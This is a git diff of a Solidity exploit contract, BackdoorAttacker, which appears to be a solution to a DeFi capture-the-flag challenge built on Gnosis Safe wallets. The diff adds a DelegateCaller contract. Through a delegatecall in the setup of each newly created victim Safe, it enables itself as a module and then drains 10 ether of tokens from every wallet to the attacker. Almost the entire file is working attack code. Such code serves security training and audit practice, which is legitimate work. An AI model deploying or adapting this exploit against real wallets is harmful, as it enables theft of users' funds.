@@ -6,6 +6,7 @@ import "hardhat/console.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
+import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
@@ -32,27 +33,25 @@ contract BackdoorAttacker {
         proxyFactory = GnosisSafeProxyFactory(proxyFactory_);
     }
 
-    function attack(address[] calldata victums) external {
+    function attack(address[] calldata victums, address delegateCallAttacker) external {
         bytes memory delegateCalldata = abi.encodeWithSelector(
-            ModuleManager.execTransactionFromModule.selector,
-            token,
-            0,
-            abi.encodeWithSelector(IERC20.approve.selector, msg.sender, 10 ether),
-            0
+            ModuleManager.enableModule.selector,
+            delegateCallAttacker
         );
+
+        console.log("DelegateCallAttacker: ", delegateCallAttacker);
+
+        address[] memory wallets = new address[](victums.length);
 
         for (uint256 i; i < victums.length;) {
             address[] memory owners = new address[](1);
             owners[0] = victums[i];
 
-            /**
-             * Precalculate future proxy contract address so it could be passed to be called via `delegatecall`
-             */
             bytes memory initdata = abi.encodeWithSelector(
                 GnosisSafe.setup.selector,
                 owners,
                 1,
-                token,
+                delegateCallAttacker,
                 delegateCalldata,
                 address(0),
                 address(0),
@@ -67,17 +66,50 @@ contract BackdoorAttacker {
                 callback
             );
 
-            console.log(token.allowance(address(wallet), address(this)));
+            console.log("Created wallet: ", address(wallet));
+            console.log("Module enabled: ", ModuleManager(address(wallet)).isModuleEnabled(delegateCallAttacker));
+            // (address[] memory modules, ) = ModuleManager(address(wallet)).getModulesPaginated(address(0x1), 10);
+            // console.log("Modules: ", modules[0]);
 
-            // token.transferFrom(
-            //     victums[i],
-            //     msg.sender,
-            //     10 ether
-            // );
+            wallets[i] = address(wallet);
 
             unchecked {
                 ++i;
             }
+        }
+
+        DelegateCaller(delegateCallAttacker).pullFunds(
+            address(token),
+            wallets,
+            msg.sender
+        );
+    }
+}
+
+contract DelegateCaller { 
+    address internal constant SENTINEL_MODULES = address(0x1);
+
+    address dummy;
+    mapping(address => address) internal modules;
+
+    function enableModule(address module) external {
+        // Module address cannot be null or sentinel.
+        require(module != address(0) && module != SENTINEL_MODULES, "GS101");
+        // Module cannot be added twice.
+        require(modules[module] == address(0), "GS102");
+        modules[module] = modules[SENTINEL_MODULES];
+        modules[SENTINEL_MODULES] = module;
+    }
+
+
+    function pullFunds(address token, address[] memory wallets, address receiver) external {
+        for (uint i; i < wallets.length; i++) {
+            ModuleManager(wallets[i]).execTransactionFromModule(
+                token,
+                0,
+                abi.encodeWithSelector(IERC20.transfer.selector, receiver, 10 ether),
+                Enum.Operation.Call
+            );
         }
     }
 }
